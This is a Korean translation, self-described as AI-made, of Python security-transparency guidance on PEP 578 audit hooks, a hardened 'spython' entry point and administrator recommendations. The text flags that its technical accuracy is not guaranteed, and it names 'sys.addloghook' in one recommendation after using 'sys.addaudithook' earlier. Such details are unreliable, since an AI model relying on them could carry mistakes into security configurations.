PowerShell은 이러한 문제를 해결하기 위해 투명성과 방지라는 유사한 목표를 향해 강화된 스크립팅 엔진의 한 예입니다. 시스템 관리자는 비정상적이거나 악의적인 사용을 탐지하기 위해 Python의 특정 사용을 감사해야 하며, PEP 578을 통해 Python 런타임은 이를 제공할 수 있습니다.

Windows에서는 스크립트 블록 로깅, DeviceGuard, AMSI, 영구 영역 식별자, 이벤트 추적과 같은 특정 기능들이 PEP 578에서 추가된 훅을 통해 통합될 수 있습니다. Linux에서는 gnupg, sd_journal, OpenBSM, syslog, auditd, SELinux labels 등이 통합될 수 있습니다. macOS에서는 OpenBSM 및 syslog 기능이 통합될 수 있습니다.

진정한 보안 투명성은 Python 단독으로는 완전히 달성할 수 없습니다. 런타임은 많은 이벤트를 감사할 수 있지만, 로그가 검토되고 분석되지 않으면 가치가 없습니다.

### 요약 권장 사항 (Summary Recommendations)

*   **대체 진입점 사용:** 시스템 관리자는 공격 노출 영역(surface area)을 줄이고 감사 훅을 안전하게 활성화하기 위해 (기본 `python.exe` 또는 `pythonX.Y` 외에) 대체 진입점을 제공하고 사용해야 합니다.
*   **Python 설치 보호:** 시스템 관리자는 파일 권한, 접근 제어 목록(ACL) 및 서명 유효성 검사(signature validation)와 같이 운영 체제에서 제공하는 모든 조치를 사용하여 Python 설치 파일의 수정을 방지해야 합니다.
*   **로그 중앙 집중화:** 시스템 관리자는 모든 것을 로깅하고 가능한 한 빨리 로그를 중앙 위치로 수집해야 합니다.
*   **탐지 우선순위:** 시스템 관리자는 오용 **방지(prevention)**보다 오용 **탐지(detection)**에 우선순위를 두어야 합니다.

### 진입점 제한 (Restricting the Entry Point)

머신에 Python이 존재함으로써 드러나는 주요 취약점 중 하나는 시스템에 의한 탐지나 검증 없이 임의의 코드를 실행할 수 있다는 것입니다. 기본 진입점은 명령줄, 표준 입력에서 실행을 허용하고 기본적으로 활성화된 훅이 없기 때문에 이러한 작업이 훨씬 쉬워집니다.

프로덕션 머신에서는 기본 진입점 대신 수정된 진입점을 사용하는 것이 권장됩니다. 이 섹션에서는 프로덕션 머신에 권장되는 수준의 보안 투명성을 제공하는 가상의 `spython` 진입점을 설명합니다.

#### 대부분의 명령줄 인자 제거 (Remove most command-line arguments)

`spython` 진입점은 스크립트 파일이 첫 번째 인자로 전달되어야 하며, 그 앞에 어떤 옵션도 허용하지 않습니다. 이는 인-메모리 데이터 또는 비스크립트 파일(예: 피클)로부터의 임의 코드 실행을 방지합니다. 옵션 `-B`, `-E`, `-s`는 가정됩니다. `._pth` 접미사를 가진 파일이 존재하면 `sys.path`를 초기화하는 데 사용됩니다.

#### 감사된 이벤트 로깅 (Log audited events)

초기화 전에 `spython`은 모든 감사된 이벤트를 OS 관리 로그 파일에 기록하는 감사 훅을 설정합니다. Windows에서는 이벤트 추적(Event Tracing) 기능이고, 다른 플랫폼에서는 `syslog`로 전송됩니다. 로그는 정보 손실을 방지하기 위해 가능한 한 자주 머신에서 복사됩니다. 감사 훅은 또한 `sys.addaudithook`의 모든 이벤트를 중단하여 다른 훅이 추가되는 것을 방지합니다. 로깅 훅은 네이티브 코드(native code)로 작성되며 인터프리터가 초기화되기 전에 구성됩니다.

주요 목표는 모든 Python 프로세스가 취한 모든 작업을 기록하여 오프라인에서 탐지를 수행하고, 더 심층적인 분석 및 머신 러닝 알고리즘 사용을 가능하게 하는 것입니다.

#### 가져올 수 있는 모듈 제한 (Restrict importable modules)

초기화 전에 `spython`은 `os.open_for_import`로 열린 모든 파일을 검증하는 `open-for-import` 훅을 설정합니다. 이 구현은 모든 파일이 `.py` 접미사를 가져야 하며, 사용자 정의 감사 이벤트 `spython.open_for_import`를 발생시킵니다. 파일 내용은 메모리에 읽히고 닫힙니다.

#### 피클(pickles)의 전역 변수 제한 (Restrict globals in pickles)

`spython` 진입점은 기본 구현을 사용하는 모든 `pickle.find_class` 이벤트를 중단합니다.

#### `os.system` 방지 (Prevent os.system)

`spython` 진입점은 모든 `os.system` 호출을 중단합니다. `subprocess.Popen(shell=True)`는 허용되지만(로깅됨), `os.system`은 익스플로잇에 사용될 가능성이 높고 프로덕션 코드에서 정당한 사용 이유가 거의 없기 때문입니다.

### 일반 권장 사항 (General Recommendations)

*   **자체 진입점 구축:** 시스템 관리자는 자체 진입점을 구축하고 환경의 보안 시스템과 직접 인터페이스해야 합니다.
*   **로컬 파일에 로그 기록 금지:** 감사 메시지는 로컬 파일에 기록해서는 안 되며, `ETW` 또는 `auditd`와 같은 전용 도구를 사용해야 합니다.
*   **기본 Python 진입점 배포 금지:** 기본 `python` 진입점은 프로덕션 머신에 배포되어서는 안 됩니다.
*   **읽기 전용 배포:** Python 배포는 배포 후 및 사용 중에 읽기 전용으로 만들어져야 합니다.
*   **파일 서명 포함:** 플랫폼이 지원하는 경우, 시스템 관리자는 모든 파일에 서명을 포함하고 개인 인증서를 사용하여 검증해야 합니다.
*   **많은 이벤트 로깅:** 시스템 관리자는 가능한 한 많은 감사 이벤트를 로깅하고, 로컬 머신에서 로그를 자주 복사해야 합니다.
*   **탐지 우선:** 대부분의 작업은 정상적인 사용 중에 발생할 수 있거나, 방지하면 공격자가 이를 우회하도록 유도할 수 있는 경우 중단되어서는 안 됩니다. 인지(awareness)가 방지(prevention)보다 높은 우선순위입니다.
*   **로깅 후 중단:** 감사 훅은 이벤트를 중단하기 전에 로그에 이벤트를 기록해야 합니다.
*   **이벤트 상관 관계 식별:** 시스템 관리자는 이벤트 간의 상관 관계를 식별해야 합니다.
*   **C 코드에서 감사 훅 설정:** 첫 번째 감사 훅은 `Py_Initialize`가 호출되기 전에 C 코드에서 설정되어야 하며, `sys.addloghook` 이벤트를 무조건 중단해야 합니다.
*   **속성 변경 감지:** `importlib`의 `open_for_import` 사용은 몽키패칭(monkeypatching)으로 쉽게 우회될 수 있으므로, `type` 객체의 속성 변경을 탐지하는 감사 훅을 사용해야 합니다.

### 하지 말아야 할 것 (Things not to do)

*   **Python 런타임 내 샌드박스 구현 시도 금지:** Python 런타임 내에서 샌드박스를 구현하려는 시도는 성공적이지 못했습니다. 최선의 방법은 하이퍼바이저 수준 격리를 포함한 샌드박스 환경 내에서 제한 없는 Python을 실행하거나, 권한 없는 코드가 시작되지 않도록 방지하는 것입니다.
*   **정적 분석에 의존한 신뢰할 수 없는 코드 검증 금지:** 사용하기 전에 정적 분석에 의존하여 신뢰할 수 없는 코드를 검증하지 마십시오. 최선의 방법은 코드 서명과 같이 신뢰할 수 있는 코드를 사전 승인하고, 불가능한 경우 안티-맬웨어 스캐너와 같이 알려진 악성 코드를 식별하는 것입니다.
*   **이벤트 로깅 없이 감사 훅으로 작업 중단 금지:** 이벤트를 먼저 로깅하지 않고 감사 훅을 사용하여 작업을 중단하지 마십시오.

> ⚠️ **알림:** 이 문서는 AI를 활용하여 번역되었으며, 기술적 정확성을 보장하지 않습니다. 정확한 내용은 반드시 원문을 확인하시기 바랍니다.